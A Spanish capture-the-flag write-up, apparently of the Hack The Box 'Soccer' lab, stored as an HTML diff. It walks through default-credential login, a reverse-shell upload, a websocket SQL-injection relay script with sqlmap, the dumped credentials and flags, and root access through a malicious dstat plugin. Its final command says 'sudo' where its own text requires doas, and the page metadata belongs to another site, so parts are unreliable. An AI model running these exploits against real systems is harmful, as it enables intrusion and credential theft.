@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<!-- saved from url=(0050)https://secret.club/2022/05/11/fuzzing-solana.html -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="theme-color" content="#111111"><meta property="og:image" content="/assets/twitter.png"><link rel="preload" href="./fonts.min.css" as="style"><link rel="stylesheet" href="./fonts.min.css"><link rel="alternate" type="application/atom+xml" title="juanchan.es RSS" href="https://juanchan.es">
+
+    <title>Máquina 1</title>
+
+
+    <meta name="generator" content="Jekyll v3.9.3"><meta property="og:title" content="maquinas/ctf"><meta name="author" content="addison"><meta property="og:locale" content="en_US"><meta name="description" content="maquinas/ctf juanchan.es"><meta property="og:description" content="maquinas/ctf juanchan.es"><link rel="canonical" href="https://juachan.es"><meta property="og:url" content="https://juachan.es"><meta property="og:site_name" content="juanchan"><meta property="og:type" content="article"><meta property="article:published_time" content="2022-05-11T07:00:00+00:00"><script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"addison"},"dateModified":"2022-05-11T07:00:00+00:00","datePublished":"2022-05-11T07:00:00+00:00","description":"maquinas/ctf juanchan.es","headline":"maquinas/ctf juanchan","mainEntityOfPage":{"@type":"WebPage","@id":"https://juanchan.es"},"url":"https://juanchan.es"}</script><style> * { margin: 0; padding: 0; box-sizing: border-box; color: inherit; text-decoration: inherit; } html { background: var(--bg-0); color: var(--text-0); width: 100%; text-rendering: optimizeLegibility; font-feature-settings: "kern" 1; font-feature-settings: "liga" 1; min-width: 100vw; overflow-x: hidden; -webkit-text-size-adjust: 100%; } @media all and (min-width:640px) { html{ font-size: 16.5px; } } @media all and (min-width:720px) { html{ font-size: 17px; } } @media all and (min-width:960px) { html{ font-size: 18px; } } body { max-width: 944px; margin: 0 auto; padding: 0 24px; font-family: "Charter", serif; } header, h1, h2, h3, .sans { font-family: 'Space Grotesk', Helvetica, sans-serif; } code, .mono, summary { font-family: 'Source Code Pro', monospace; font-weight: 500; } .img-right { float: right; height: 300px; padding-left: 2em } body > header { display: flex; justify-content: space-between; align-items: center; margin: 2em 0; } nav a { margin-left: 1.5em; letter-spacing: 0.07em; font-size: .9rem; } :root { --text-0: rgba(255, 255, 255, 87%); --text-1: rgba(255, 255, 255, 60%); --bg-0: #121212; --bg-1: rgba(255, 255, 255, 5%); --bg-2: rgba(255, 255, 255, 12%); --accent: #ef5350; --keyword: #b794f6; --string: #89a2f6; --literal: #f88478; --type: #f8819c; } @media (prefers-color-scheme: light) { :root { --text-0: rgba(0, 0, 0, 87%); --text-1: rgba(0, 0, 0, 66%); --bg-0: #fff; --bg-1: #f2f2f2; --bg-2: rgba(0, 0, 0, 12%); --keyword: #7c4dff; --string: #586ada; --literal: #d14641; --type: #bd00f8; } } .tags, .pagination > :nth-child(2) { margin-bottom: 2rem; } .tags, .pagination .mono { color: var(--text-1); font-size: 0.8rem; } .tags > a, .pagination .mono { color: var(--accent); } .pagination { display: flex; justify-content: space-between; flex-wrap: wrap-reverse; } .pagination > a { font-size: 0.9rem; display: inline-block; } .pagination .mono { letter-spacing: 0.07em; } article > :not(main) { font-size: 16px; } article > h1 { font-size: 2rem; margin-bottom: 12px; } .authors { position: absolute; margin-top: 4px; color: var(--text-1); } .authors > a { color: var(--text-0); } article > div > img { display: inline; object-fit: cover; height: 48px; width: 48px; border-radius: 100%; margin-right: 8px; background: var(--bg-1); } article > time { color: var(--text-1); position: absolute; margin: -24px 0 0 56px; } article > hr { width: 128px; border: 2.5px solid var(--bg-1); margin-top: 12px; } main { margin: 2rem 0; } main > :nth-last-child(2) { margin-bottom: 2rem; } main img, main video, main iframe, main object { max-width: 100%; height: auto; display: flex; margin: auto; } main iframe { width: 100%; height: 504px; } p, ul, ol { line-height: 1.35; margin-bottom: 1rem; } details + :not(details) { margin-top: 1rem; } details + h3, details + h2, details + h1 { margin-top: 1.2rem; } object { margin-bottom: 1rem; } h1, h2, h3 { position: relative; margin: 1.2rem 0 0.2rem 0; } h3, h2 { line-height: 24px; } main h1:before, h2:before, h3:before { content: "#"; color: var(--accent); font-weight: bold; float: left; margin-left: -19px; position: absolute; } h3:before { content: ""; margin-left: -17px; height: 10px; width: 10px; background: var(--accent); border-radius: 100%; top: calc(50% - 6px); } h1 { font-size: 1.3em; } h2 { font-size: 1.2em; } h3 { font-size: 1.1em; } p a, main li a { text-decoration: underline; } summary { margin-left: -17px; cursor: pointer; } summary::marker { color: var(--accent); } details :nth-child(2) { margin-top: 0.8rem; } ul { list-style: none; } ul li, ol li { padding-left: 1rem; margin: 0 0 0.2rem 1rem; } ul li::before { content: "•"; float: left; margin-left: -2rem; transform: scale(1.4); } blockquote { color: var(--text-1); font-style: italic; margin: 0 2em; } .footnotes { border-top: 1px solid var(--bg-1); padding-top: 1rem; } pre { border-left: 4px solid var(--bg-1); margin: 0 0 1rem -24px; padding-left: 20px; overflow-x: scroll; scrollbar-width: none; -ms-overflow-style: none; } pre::-webkit-scrollbar { width: 0; height: 0; } :not(pre) > code { background: var(--bg-1); padding: 2px 4px; } pre > code { display: inline-block; } code { font-size: 14px; } @media screen and (min-width: 640px) { code { font-size: 15px; } } @media screen and (max-width: 944px) { main iframe { height: calc((100vw - 24px) * 0.5625); } blockquote { margin: 0 0 0 1.25em; } ul li::before { margin-left: -1.25rem; } ul li { padding-left: 0.625rem; margin-left: 0.625rem; } ol li { padding-left: 0.25rem; } } .aside { color: var(--text-1); } @media screen and (min-width: 1074px) { article::before { background: radial-gradient( circle at center, var(--bg-1) 25%, transparent 25% ), transparent; background-size: 10px 10px; content: ""; display: block; height: 300px; width: 300px; position: absolute; transform: translate(-72px, -72px); z-index: -1; } article { padding: 24px 0 0 24px; margin: -24px 0 0 -24px; background: var(--bg-0); } article h1:first-of-type { margin-top: 0; } body > header { margin-bottom: 5em; } } @media screen and (max-width: 1584px) { .aside { position: relative; padding: 4px 0 4px 0; border-bottom: 1.5px solid var(--bg-1); border-top: 1.5px solid var(--bg-1); } } @media screen and (min-width: 1584px) { .aside { float: left; position: absolute; left: 0; transform: translate(calc(-100% - 28px), calc(-100% - 1rem)); width: 320px; text-align: right; clear: both; } footer { position: absolute; left: calc(100% + 24px); width: 320px; top: 0; } } code .gu, code .gh { font-weight: bold; } code .p { color: var(--text-1); } code .c, code .ch, code .cm, code .cp, code .cpf, code .c1, code .cs { color: var(--text-1); } code .o, code .ow { color: var(--keyword); } code .k, code .kn, code .kc, code .kp, code .kr, code .nt, code b { color: var(--keyword); font-weight: bold; } code .kt, code .kd, code .nb, code .nl, code .nv, code .vc, code .vg, code .vi, code .vm, code .gd { color: var(--type); } code .m, code .mb, code .mf, code .mh, code .mi, code .mo, code .il, code .se { color: var(--literal); } code .s, code .sa, code .sb, code .sc, code .dl, code .sd, code .s2, code .sh, code .si, code .sx, code .sr, code .s1, code .ss, code .gi { color: var(--string); }</style>
+    </head>
+
+
+<body><header align="center"><a href="/maquinas.html">Máquinas/CTF</a><nav><a href="/">Sobre mi</a></nav></header>
+
+
+    <article aria-label="Content" itemscope="" itemtype="http://schema.org/BlogPosting"><h1 itemprop="name headline">Máquina resuelta</h1><div itemprop="author" itemscope="" itemtype="http://schema.org/Person" style="height:48px"> <img itemprop="image" alt="main authors image" src="./soccer.jpg"> <span class="mono authors"> <a href="https://secret.club/author/addison" itemprop="name">Soccer</a> </span></div><time datetime="2022-05-11T07:00:00+00:00" itemprop="datePublished" class="mono"> Feb, 2023 </time><hr><main itemprop="articleBody" style="position: relative">
+
+
+
+<h2 id="comprobación-del-sistema-operativo">1. Comprobación del sistema operativo</h2>
+<pre><code>python whichSystem.py 10.10.11.194
+</code></pre>
+<p>Tiene como salida:</p>
+<pre class=" language-bash"><code class="prism  language-bash">10.10.11.194 <span class="token punctuation">(</span>ttl -<span class="token operator">&gt;</span> 63<span class="token punctuation">)</span>: Linux
+</code></pre>
+<p>&nbsp;</p>
+<h2 id="comprobamos-servicios-y-lanzamos-scripts-principales-contra-los-principales-puertos">2. Comprobamos servicios y lanzamos scripts principales contra los principales puertos:</h2>
+<pre><code>nmap -sCV 10.10.11.194 
+</code></pre>
+<p>Obteniendo los siguientes resultados:</p>
+<pre><code>Open Ports | Service Running
+-----------|-----------------
+22         | ssh
+80         | http
+9091       | xmltec-xmlmail
+</code></pre>
+<p>Debemos añadir entonces <strong>soccer.htb</strong> al archivo <code>/etc/hosts</code>.</p>
+<p>&nbsp;</p>
+<h2 id="recorremos-la-página-web">3. Recorremos la página web</h2>
+<p>Luego de analizar y recorrer la página web, no encontramos nada que nos llame la atención, por lo que lanzamos entonces un ataque de <em>fuzzing</em> mediante la herramienta <strong>gobuster</strong>:</p>
+<pre><code>gobuster dir -u http://soccer.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</code></pre>
+<p>Esto nos dice que existe el recurso <code>/tiny</code>. Si la abrimos vemos un login de un usuario que utiliza el servicio <strong>Tiny</strong> para autenticarse. Buscando por internet podemos encontrar que este servicio utiliza credenciales por defecto, los cuales son los siguientes:</p>
+<pre><code>admin:admin@123
+user:12345
+</code></pre>
+<p>&nbsp;</p>
+<h2 id="autenticación-y-explotación-de-recursos">4. Autenticación y explotación de recursos</h2>
+<p>Observamos como con los credenciales <code>admin:admin@123</code> somos capaces de acceder a la página web. Una vez dentro vemos que se trata de una especie de <em>filemanager</em> en el que se pueden subir archivos. Subimos directamente un script que nos permite establcer una <em>revershell</em> con nuestra máquina host, en concreto utilizamos la más que conocida de <strong>pentest_monkey</strong>.</p>
+<p>Si en nuestra máquina host nos ponemos a la escucha a traǘés de <code>nc -lvp 1234</code>, observamos como somos capaces de establecer una conexíón, a través del usuario <strong>www-data</strong>.</p>
+<pre><code>Conseguimos establecer conexion
+</code></pre>
+<p>&nbsp;</p>
+<h2 id="búsqueda-de-recursos">5. Búsqueda de recursos</h2>
+<p>Si revisamos el fichero <em>sites-avaliable</em> del servicio <strong>Nginx</strong> (<code>/etc/nginx/sites-available</code>), podemos comprobar que existe un nuevo sitio web en la dirección <code>https://soc-player.soccer.htb/</code>. Por lo que añadimos en el archivo <code>/etc/hosts</code> la siguiente línea:</p>
+<pre><code>10.10.11.194 soc-player.soccer.htb
+</code></pre>
+<p>Observamos una página web en la que nos podemos registrar y entrar como dicho usuario, por lo que procedemos al registro y al acceso. Una vez autenticados si nos dirigimos al recurso <code>https://soc-player.soccer.htb/check</code> y observamos el código fuente, podemos ver que se hace una conexión mediante <strong>websocket</strong> a una base de datos:</p>
+<pre><code>var ws = new WebSocket("ws://soc-player.soccer.htb:9091");
+window.onload = function () {
+
+var btn = document.getElementById('btn');
+var input = document.getElementById('id');
+
+ws.onopen = function (e) {
+    console.log('connected to the server')
+}
+input.addEventListener('keypress', (e) =&gt; {
+    keyOne(e)
+});
+
+function keyOne(e) {
+    e.stopPropagation();
+    if (e.keyCode === 13) {
+        e.preventDefault();
+        sendText();
+    }
+}
+
+function sendText() {
+    var msg = input.value;
+    if (msg.length &gt; 0) {
+        ws.send(JSON.stringify({
+            "id": msg
+        }))
+    }
+    else append("????????")
+}
+}
+
+ws.onmessage = function (e) {
+append(e.data)
+}
+
+function append(msg) {
+let p = document.querySelector("p");
+// let randomColor = '#' + Math.floor(Math.random() * 16777215).toString(16);
+// p.style.color = randomColor;
+p.textContent = msg
+}
+</code></pre>
+<p>&nbsp;</p>
+<h2 id="explotación-websocket">6. Explotación Websocket</h2>
+<p>Si buscamos en internet algun tipo de exploit o vulnerabilidad contra <strong>WebSockets</strong>, podemos encontrar una forma de automatizar <strong>ataques Sqli</strong> contra <em>websocket</em>, en el siguiente repositorio podemos encontrar toda la información <code>https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html</code>. A groso modo, deberemos de crear un <em>script</em> en nuestra máquina host, en nuestro caso llamado <code>websocket-sqli.py</code>, en el que crearemos un <code>MiddelWare Server</code> intermedio, para enviarle peticiones al <em>websocket</em> que sirve la aplicación:k</p>
+<pre><code>from http.server import SimpleHTTPRequestHandler
+from socketserver import TCPServer
+from urllib.parse import unquote, urlparse
+from websocket import create_connection
+
+ws_server = "ws://soc-player.soccer.htb:9091/ws"
+
+def send_ws(payload):
+	ws = create_connection(ws_server)
+	# If the server returns a response on connect, use below line	
+	#resp = ws.recv() # If server returns something like a token on connect you can find and extract from here
+	
+	# For our case, format the payload in JSON
+	message = unquote(payload).replace('"','\'') # replacing " with ' to avoid breaking JSON structure
+	data = '{"id":"%s"}' % message
+
+	ws.send(data)
+	resp = ws.recv()
+	ws.close()
+
+	if resp:
+		return resp
+	else:
+		return ''
+
+def middleware_server(host_port,content_type="text/plain"):
+
+	class CustomHandler(SimpleHTTPRequestHandler):
+		def do_GET(self) -&gt; None:
+			self.send_response(200)
+			try:
+				payload = urlparse(self.path).query.split('=',1)[1]
+			except IndexError:
+				payload = False
+				
+			if payload:
+				content = send_ws(payload)
+			else:
+				content = 'No parameters specified!'
+
+			self.send_header("Content-type", content_type)
+			self.end_headers()
+			self.wfile.write(content.encode())
+			return
+
+	class _TCPServer(TCPServer):
+		allow_reuse_address = True
+
+	httpd = _TCPServer(host_port, CustomHandler)
+	httpd.serve_forever()
+
+
+print("[+] Starting MiddleWare Server")
+print("[+] Send payloads in http://localhost:8081/?id=*")
+
+try:
+	middleware_server(('0.0.0.0',8081))
+except KeyboardInterrupt:
+	pass
+</code></pre>
+<p>En otra terminal deberemos lanzar la herramienta <strong>sqlmap</strong> para que vaya lanzando ataques sqli contra el servidor intermedio creado:</p>
+<pre><code>sqlmap -u "http://localhost:8081/?id=1" -p "id"
+</code></pre>
+<p>Podemos ver entonces, como después de varias peticiones enviando distintos <em>payloads</em> automáticos, somos capaces de obtener los siguientes credenciales:</p>
+<pre><code>1324 | player@player.htb | player   | PlayerOftheMatch2022
+</code></pre>
+<p>Probamos entonces a conectarnos mediante el servicio <strong>ssh</strong>, y somos capaces de iniciar sesión con el usuario <strong>player</strong>.</p>
+<pre><code>ssh player@10.10.11.194
+</code></pre>
+<p>&nbsp;</p>
+<h2 id="flag-de-usuario">7. Flag de usuario</h2>
+<p>Somos capaces de obtener la flag de usuario -&gt; <em>526fd6d38c6905553d9822476a567a82</em></p>
+<p>&nbsp;</p>
+<h2 id="escalada-de-privilegios">8. Escalada de privilegios</h2>
+<p>Para ello podemos emplear tanto el <em>script</em> <strong>linpeas</strong> o realizar la búsquyeda a mano. Buscando binarios con <strong>SUID abiertos</strong>:</p>
+<pre><code>find / -uid 0 -perm -4000 -type f 2&gt;/dev/null
+</code></pre>
+<p>Nos llama la atención el siguiente archivo <code>/usr/local/bin/doas</code>. Por lo que podemos comprobar como es el fichero de configuración de <em>doas</em>. Normalmente este se encuentra en la ruta <code>/etc/doas.conf</code>. Pero en este caso no está en esta ruta por lo que lo buscamos con el sigueinte comando:</p>
+<pre><code>find / -type f -name doas.conf 2&gt;/dev/null
+</code></pre>
+<p>Observando que este se encuentra en la ruta:</p>
+<pre><code>/usr/local/etc/doas.conf
+</code></pre>
+<p>&nbsp;</p>
+<h2 id="explotación">8. Explotación</h2>
+<p>Si observamos dicho archivo observamos lo siguiente:</p>
+<pre><code>permit nopass player as root cmd /usr/bin/dstat
+</code></pre>
+<p>Es decir, por lo que podemos ejecutar el comando <strong>dstat</strong> como el usuario <strong>root</strong>. Observando un poco dicho comando vemos que se trata de una herramienta para monitorizar el uso de un servidor, y somos capaces de ver lo siguiente:</p>
+<pre><code>Paths that may contain external dstat_*.py plugins:
+
+       ~/.dstat/
+       (path of binary)/plugins/
+       /usr/share/dstat/
+       /usr/local/share/dstat/
+</code></pre>
+<p>Es decir, podemos ejecutar plugins externos, por lo que podemos añadir un nuevo plugin que ejecute una <em>revershell</em> como el usuario <strong>root</strong>, por ejemplo en el directorio <code>/usr/local/share/dstat/</code>, ejecutando para el ello el siguiente comando:</p>
+<pre><code>echo 'import os; os.execv("/bin/sh", ["sh"])' &gt;/usr/local/share/dstat/dstat_xxx.py
+sudo dstat --xxx
+</code></pre>
+<p>Pero vemos que esto no nos es posible, porque no es con <strong>sudo</strong>, sino con el servicio <strong>doas</strong>, por lo que si ejecutamos:</p>
+<pre><code>sudo dstat --xxx
+</code></pre>
+<p>Observamos como somos capaces de obtener un <em>shell</em> como el usuario <strong>root</strong>.</p>
+<p>&nbsp;</p>
+<h2 id="flag-de-root">9. Flag de root</h2>
+<p>Somos entonces capaces de obtener el flag del usuario <strong>root</strong> -&gt; <em>182bc6b999dd8751f4554cf7fbba49a1</em></p>
+
+
+
+
+
+
+
+
+
+
+<p>&nbsp;</p><p>&nbsp;</p>
+</div>
+     <div class="footer-credits" style="display: flex; justify-content: flex-end">
+        <a> Made by Juan González </a>
+    </div>
+</div>
+</body></html>
+
+
+
+
+
+
